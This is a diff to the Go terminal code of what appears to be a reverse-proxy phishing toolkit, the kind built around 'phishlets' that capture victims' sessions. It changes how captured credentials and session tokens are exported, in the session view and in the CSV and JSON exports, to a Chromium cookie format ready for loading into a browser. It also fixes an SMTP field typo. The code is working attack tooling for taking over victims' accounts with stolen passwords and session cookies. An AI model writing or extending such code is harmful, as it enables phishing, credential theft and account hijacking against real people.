@@ -372,12 +372,6 @@ func (t *Terminal) handleSessions(args []string) error {
 		s_found := false
 		for _, s := range sessions {
 			if s.Id == id {
-				pl, err := t.cfg.GetPhishlet(s.Phishlet)
-				if err != nil {
-					log.Error("%v", err)
-					break
-				}
-
 				s_found = true
 				tcol := dgray.Sprint("empty")
 				if len(s.Tokens) > 0 {
@@ -398,7 +392,7 @@ func (t *Terminal) handleSessions(args []string) error {
 				}
 
 				if len(s.Tokens) > 0 {
-					json_tokens := tokensToJSON(pl, s.Tokens)
+					json_tokens := tokensToCookie(s.Tokens, "Chromium")
 					t.output("%s\n", json_tokens)
 				} else {
 					t.output("\n")
@@ -494,12 +488,7 @@ func (t *Terminal) handleSessions(args []string) error {
 				wr := csv.NewWriter(outFile)
 				wr.Write([]string{"Id", "Phishlet", "Username", "Password", "Tokens (base64 encoded)", "Remote IP", "Time"})
 				for _, s := range sessions {
-					pl, err := t.cfg.GetPhishlet(s.Phishlet)
-					if err != nil {
-						log.Error("%v", err)
-						break
-					}
-					base64tokens := base64.StdEncoding.EncodeToString([]byte(tokensToJSON(pl, s.Tokens)))
+					base64tokens := base64.StdEncoding.EncodeToString([]byte(tokensToCookie(s.Tokens, "Chromium")))
 					wr.Write([]string{strconv.Itoa(s.Id), s.Phishlet, s.Username, s.Password, base64tokens, s.RemoteAddr, time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")})
 				}
 				wr.Flush()
@@ -516,17 +505,12 @@ func (t *Terminal) handleSessions(args []string) error {
 				}
 				var exported []*ExportedSession
 				for _, s := range sessions {
-					pl, err := t.cfg.GetPhishlet(s.Phishlet)
-					if err != nil {
-						log.Error("%v", err)
-						break
-					}
 					es := &ExportedSession{
 						Id:         strconv.Itoa(s.Id),
 						Phishlet:   s.Phishlet,
 						Username:   s.Username,
 						Password:   s.Password,
-						Tokens:     base64.StdEncoding.EncodeToString([]byte(tokensToJSON(pl, s.Tokens))),
+						Tokens:     base64.StdEncoding.EncodeToString([]byte(tokensToCookie(s.Tokens, "Chromium"))),
 						RemoteAddr: s.RemoteAddr,
 						Time:       time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"),
 					}
@@ -1532,7 +1516,7 @@ func (t *Terminal) sprintNotifiers() string {
 	hcyan := color.New(color.FgHiCyan)
 	//white := color.New(color.FgHiWhite)
 	//n := 0
-	cols := []string{"id", "enabled", "on_event", "url", "method", "hide_sensitive", "auth_header_name", "auth_header_value", "basic_auth_user", "basic_auth_password", "forward_param", "from_address", "smpt_server"}
+	cols := []string{"id", "enabled", "on_event", "url", "method", "hide_sensitive", "auth_header_name", "auth_header_value", "basic_auth_user", "basic_auth_password", "forward_param", "from_address", "smtp_server"}
 	var rows [][]string
 	for n, N := range t.cfg.notifiers {
 		rows = append(rows, []string{strconv.Itoa(n), hiblue.Sprint(N.Enabled), cyan.Sprint(N.OnEvent), hcyan.Sprint(N.Url), yellow.Sprint(N.Method), green.Sprint(N.HideSensitive), green.Sprint(N.AuthHeaderName), higreen.Sprint(N.AuthHeaderValue), higreen.Sprint(N.BasicAuthUser), higreen.Sprint(N.BasicAuthPassword), green.Sprint(N.ForwardParam), green.Sprint(N.FromAddress), green.Sprint(N.SMTPserver)})
